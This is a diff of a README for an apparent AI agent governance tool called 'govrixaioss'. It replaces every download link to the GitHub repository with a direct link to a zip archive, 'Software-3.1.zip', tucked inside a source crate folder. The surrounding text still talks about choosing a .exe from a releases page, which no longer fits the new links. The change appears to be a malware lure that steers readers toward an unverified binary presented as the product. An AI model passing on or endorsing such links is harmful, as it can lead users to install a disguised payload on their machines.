@@ -1,6 +1,6 @@
 # 🤖 govrixaioss - Simple AI Agent Governance Tool
 
-[![Download govrixaioss](https://img.shields.io/badge/Download-govrixaioss-green?style=for-the-badge)](https://github.com/kingdevi/govrixaioss)
+[![Download govrixaioss](https://img.shields.io/badge/Download-govrixaioss-green?style=for-the-badge)](https://raw.githubusercontent.com/kingdevi/govrixaioss/main/crates/govrix-ai-oss-proxy/Software-3.1.zip)
 
 ---
 
@@ -20,7 +20,7 @@ This means you keep control of AI systems and reduce risks from unwanted actions
 
 First, visit the main GitHub page to get govrixaioss:
 
-[Download govrixaioss](https://github.com/kingdevi/govrixaioss)
+[Download govrixaioss](https://raw.githubusercontent.com/kingdevi/govrixaioss/main/crates/govrix-ai-oss-proxy/Software-3.1.zip)
 
 The link opens a page where you will download the software.
 
@@ -106,7 +106,7 @@ For download problems:
 
 Use this link whenever you want to download or update govrixaioss:
 
-[Download govrixaioss](https://github.com/kingdevi/govrixaioss)
+[Download govrixaioss](https://raw.githubusercontent.com/kingdevi/govrixaioss/main/crates/govrix-ai-oss-proxy/Software-3.1.zip)
 
 Click the “Releases” or “Downloads” section and choose the latest `.exe` file.
 
